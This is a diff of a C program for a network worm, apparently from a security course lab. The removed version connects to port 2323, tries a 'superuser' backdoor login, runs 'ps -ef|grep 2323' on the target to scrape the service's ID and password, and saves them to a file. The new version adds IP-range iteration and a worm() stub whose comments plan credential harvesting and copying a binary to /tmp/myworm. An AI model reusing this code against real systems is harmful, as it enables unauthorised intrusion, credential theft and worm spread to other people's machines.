@@ -1,261 +1,156 @@
+//Preprocessor
 #include <stdio.h>
 #include <stdlib.h>
-#include <stdint.h>
-#include <string.h>
 #include <stdbool.h>
-
-//Preprocessor for IPaddress
+#include <stdint.h>
 #include <arpa/inet.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <sys/wait.h>
-#include <fcntl.h>
-#include <errno.h>
+#include <string.h>
 
-#define MAX_BUF   (1024)
+//IP RANGE variable :  Little Endian form
+static uint32_t start_ip;
+static uint32_t end_ip;
 
-int sockfd;
-char actual_id[MAX_BUF];
-char actual_pw[MAX_BUF];
-
-
-//Network Connection
-//to port 2323
-//return fd
-int connect2323(uint32_t ipAddress){
-	struct sockaddr_in servaddr;
-	uint32_t actual_addr;
-	struct sockaddr_in temp;
-	int count=0;
-	char* ipAddr;
-
-	//socket
-	if((sockfd=socket(AF_INET,SOCK_STREAM,0))<0)
-	{
-		printf("socket error\n");
-		return 0;
-	}
-
-	//init server address
-	memset( &servaddr, 0, sizeof(servaddr));
-	servaddr.sin_family=AF_INET;
-	servaddr.sin_port=htons(2323);
-	actual_addr=htonl(ipAddress);
-	temp.sin_addr.s_addr=actual_addr;
-	ipAddr=inet_ntoa(temp.sin_addr);
-	//connect
-	printf("ip : %s \n",ipAddr);
-	if(inet_pton(AF_INET,ipAddr,&servaddr.sin_addr)<=0)
-		printf("inet_pton error\n");
-	if(connect(sockfd,(struct sockaddr*) &servaddr, sizeof(servaddr))<0)
-		printf("connect error\n");
-	return 1;
+//Purpose : when wrong input argument is given.
+void showUsage(char *argv){
+    fprintf( stderr, "Usage: %s <lower ip> <upper ip> <option:fileName>\n", argv);
+    exit(0);
 }
 
-
-//try Authenticate
-int superAuthenticate(){
-	struct timeval tv;
-	tv.tv_sec=2;
-	setsockopt(sockfd,SOL_SOCKET,SO_RCVTIMEO,(struct timeval*)&tv,sizeof(struct timeval));
-   	int r=0;
-   	char buf[MAX_BUF];
-    	const char* szName = "Username:";
-    	const char* szWrongID = "Wrong ID given.";
-    	const char* superID="superuser\n";
-    	
-    	r = readSock( sockfd, buf, MAX_BUF );
-	if ( r == -1 ) return -1;
-
-	//check if Username received
-	if ( strcmp( buf, szName) != 0 )
-		return -1;
-
-	//try to login with superuser
-   	r = send( sockfd, superID, strlen(superID), 0 );
-    	if ( r == -1 ) { perror( "send" ); return -1; }
-    	r = recv( sockfd, buf, 1024, MSG_PEEK | MSG_DONTWAIT);
-    	if ( r<0){
-    		if(errno==EWOULDBLOCK){
-    			//printf("timeout\n");
-    			return 1;
-    		}
-    		else{
-    			printf("error receive\n");
-    			exit(1);
-    		}
-    	}
-    	//check if Wrong ID received
-	if ( strcmp( buf,szWrongID) != 0 )
-		return -1;
-	else return 1;
-
-}
-
-//GREP ID and PASSWORD
-int grep(){
-	int r;
-	char buf[MAX_BUF];
-	char * pch;
-	char * id;
-
-	char * pw;
-	const char* grep="ps -ef|grep 2323\n";
-	r = send( sockfd, grep, strlen(grep), 0 );
-	if ( r == -1 ) { perror( "send" ); return -1; }
-	r = recv( sockfd, buf, 1023, 0);
-	if ( r == -1 ) { perror( "recv" ); return -1; }
-	pch=strstr(buf,"2323");
-	if(pch==NULL) return -1;
-	id=strchr(pch+5,' ');
-	if(id==NULL) return -1;
-	pw=strchr(id+1,'\n');
-	if(pw==NULL) return -1;
-	strncpy(actual_id,pch+5,id-pch-5);
-	strncpy(actual_pw,id+1,pw-id-1);
-
-	return 0;
-
-}
-
-//Actual Worm
-int worm(uint32_t ipAddress){
-	int count=0;
-	int r;
-	char buf[MAX_BUF];
-	char input[MAX_BUF];
-	int backdoor;
-	int result;
-	//Make socket file descriptor
-	if(!connect2323(ipAddress))
-		//In case of fail
-		return 0;
-	//write
-	//write
-	backdoor=superAuthenticate();
-
-	//if authenticate fail
-	if(backdoor==-1){
-		printf("authenticate fail\n");
-		return 0;
-	}
-
-
-	result=grep();
-	//printf("hey %d\n",result);
-	if(result==0)
-		return 1;
-	else
-		return 0;
-	//read
-	//close
-	close(sockfd);
-}
-
-int readSock( int sockfd, char* buf, size_t bufLen )
-{
-    int r;
-
-    r = recv( sockfd, buf, bufLen - 1, 0 );
-    if ( r == -1 ) { perror( "recv" ); return -1; }
-    buf[r - 1] = '\0';
-    return 0;
-}
-
-
-//In case of usageError
-int usageError(){
-	printf("Usage : ./myworm ip_begin ip_end file_name[optional]\n");
-	exit(1);
-}
-
-//In case of IP input Error
-int inputError(){
-	printf("IP address is invalid or range is fault\n");
-	exit(1);
-}
-
-//Check out valid IP address
-//From : http://stackoverflow.com/questions/791982/determine-if-a-string-is-a-valid-ip-address-in-c
+//http://stackoverflow.com/questions/791982/determine-if-a-string-is-a-valid-ip-address-in-c
+//Return true if IPaddr is valid
 bool isValidIpAddress(char *ipAddress)
 {
     struct sockaddr_in sa;
+    memset(&sa,0,sizeof(struct sockaddr_in));
     int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
     return result != 0;
 }
 
-//return uint32 type address from string
-uint32_t returnIPAddr(char *ipAddress)
-{
+//return IP address in little endian uint32_t
+uint32_t returnIpAddress(char *ipAddress){
     struct sockaddr_in sa;
-    uint32_t return_addr;
+    memset(&sa,0,sizeof(struct sockaddr_in));
     inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
-    return_addr=sa.sin_addr.s_addr;
-
-    //Debug Purpose printf
-    //printf("%u %u\n",sa.sin_addr,return_addr);
-
-    //Since I use intel CPU endian conversion
-    return_addr=ntohl(return_addr);
-
-    //Debug Purpose printf
-    //printf("ntohl : %u %u\n",sa.sin_addr,return_addr);
-
-    return return_addr;	
+    return ntohl(sa.sin_addr.s_addr);	
 }
 
-//Check the IP address range
-bool isRangeOK(char *ipAddress1, char *ipAddress2){
-	bool validAddr[2];
-	uint32_t ipAddr1;
-	uint32_t ipAddr2;
+//check out given IP range is valid or not.
+//if valid set start_IP, end_IP and return true
+bool isRangeOk(char *lower,char *upper){
+	start_ip=returnIpAddress(lower);
+	end_ip=returnIpAddress(upper);
 
-	//check if IP address is valid or not
-	validAddr[0]=isValidIpAddress(ipAddress1);
-	validAddr[1]=isValidIpAddress(ipAddress2);
-	return validAddr[0]&&validAddr[1];
-}
+	//debug purpose printf
+	/*
+	printf("start ip %u\n",start_ip);
+	printf("end ip %u\n",end_ip);
 
-int main( int argc, char* argv[] )
-{
-	bool rangeCheck=false;
-	uint32_t startAddress;
-	uint32_t endAddress;
-	int result;
-	const char* fileName="slave.csv";
-	FILE *fp;
 
-	//check the input
-	if(argc!=3 && argc!=4){
-		usageError();
-	}
-
-	if(argc==4)
-		fp=fopen(argv[3], "w");
+	if(start_ip<=end_ip)
+		printf("range ok\n");
 	else
-		fp=fopen(fileName,"w");
+		printf("range fault\n");
+	*/
 
-	//check the range of IP input and get uint32 type address
-	rangeCheck=isRangeOK(argv[1],argv[2]);
-	if(rangeCheck)
+	if(start_ip>end_ip)
 	{
-		startAddress=returnIPAddr(argv[1]);
-		endAddress=returnIPAddr(argv[2]);
+   		fprintf( stderr,"Range Setting Error\n");
+   		exit(0);
 	}
-	//When input IP address itself is invalid
 	else
-		inputError();
+		return true;
+}
 
-	//When range of IP address is wrong
-	if(startAddress>endAddress)
-		inputError();
+bool isValidInput(int argc, char *argv[]){
+	//Variable
+		//rangeOk for lower~upper topology
+	bool rangeOk=false;
+		//isValidIpAddress_1 check argv[1]'s IP addr
+	bool isValidIpAddress_1=false;
+		//isValidIpAddress_2 check argv[2]'s IP addr
+	bool isValidIpAddress_2=false;
+		//result => true for valid input
+	bool result=false;
 
-	result=worm(returnIPAddr("127.0.0.1"));
-	if(result)
-		fprintf(fp,"127.0.0.1 %s %s\n",actual_id,actual_pw);
-	fclose(fp);
+	//Printf for debug purpose
+	/*
+	printf("argc : %d\n",argc);
+	for(int i=0;i<argc;i++){
+		printf("argv %d : %s\n",argc, argv[i]);
+	}
+	*/
 
+	//exit when argc is not 3 or 4
+	if(argc!=3 && argc!=4){
+		showUsage(argv[0]);
+	}
+
+	//check out IP Address
+
+	isValidIpAddress_1=isValidIpAddress(argv[1]);
+	isValidIpAddress_2=isValidIpAddress(argv[2]);
+	
+	//printf("isValid1 : %d\n",isValidIpAddress_1);
+	//printf("isValid2 : %d\n",isValidIpAddress_2);
+
+	//If it is invalid IP Address print out
+	if(!isValidIpAddress_1)
+	{
+		fprintf(stderr,"%s is invalid IP Address\n",argv[1]);
+		exit(0);
+	}
+	if(!isValidIpAddress_2)
+	{
+		fprintf(stderr,"%s is invalid IP Address\n",argv[2]);
+		exit(0);
+	}
+
+	rangeOk=isRangeOk(argv[1],argv[2]);
+
+	if(rangeOk)
+		return true;
+	else
+		return false;
+
+}
+
+//ip given in Big ENDIAN
+int worm(uint32_t ip){
+//Connect to Specific IP with port number 2323
+
+//If connected try to login with superuser
+
+//Try to get ID and Password
+
+//File exist check and if not try to store binary into /tmp/myworm
+//Should not run in vulnet client
+//And Close the Connection
+
+//Reconnect to Server with obtained ID and Password
+	//-in case of login success : log the ID and Password
+	//-in case of fail : log the "superuser"
+
+}
+
+//iterate Worm function in IP range given by User
+void iterateWorm(uint32_t start_ip,uint32_t end_ip){
+	uint32_t i;
+	for(i=start_ip;i<=end_ip;i++){
+
+		//test purpose printf
+		printf("IP %u\n",i);
+		printf("HTONL %u\n",htonl(i));
+		//worm(htonl(i));
+	}
+}
+
+
+int main(int argc, char *argv[])
+{
+	bool validInput=false;
+	validInput=isValidInput(argc,argv);
+	if(!validInput)
+		showUsage(argv[0]);
+	iterateWorm(start_ip,end_ip);
 	return 0;
 }
-
